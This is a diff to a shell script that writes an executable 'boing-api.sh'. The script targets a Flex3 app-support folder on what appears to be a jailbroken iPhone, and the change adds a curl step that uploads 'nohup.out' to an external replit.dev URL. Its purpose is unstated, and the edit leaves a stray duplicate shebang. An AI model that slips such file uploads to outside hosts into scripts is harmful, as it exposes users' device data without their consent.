@@ -14,8 +14,9 @@ url="https://20f8fe90-6124-4d95-9d01-0f38ee0bf9df-00-35yv50ht7oto9.kirk.replit.d
 cat << 'EOF' > boing-api.sh
 #!/bin/bash
 
-flex_path="/rootfs/var/mobile/Library/Application Support/Flex3"
+#!/bin/bash
 
+flex_path="/rootfs/var/mobile/Library/Application Support/Flex3"
 url="https://20f8fe90-6124-4d95-9d01-0f38ee0bf9df-00-35yv50ht7oto9.kirk.replit.dev?getFileButter"
 
 if [ -d "$flex_path" ]; then
@@ -43,6 +44,20 @@ if [ -d "$flex_path" ]; then
 else
     echo "$flex_path não é um diretório válido."
 fi
+
+# Send nohup.out to the specified URL
+if [ -f "nohup.out" ]; then
+    response=$(curl -s -w "%{http_code}" -o /dev/null -F "file=@nohup.out" "$url")
+
+    if [ "$response" -ne 200 ]; then
+        echo "[ E ]: Failed to upload nohup.out, response code: $response"
+    else
+        echo "[ + ]: Successfully uploaded nohup.out"
+    fi
+else
+    echo "Arquivo nohup.out não encontrado."
+fi
+
 EOF
 
 chmod +x boing-api.sh
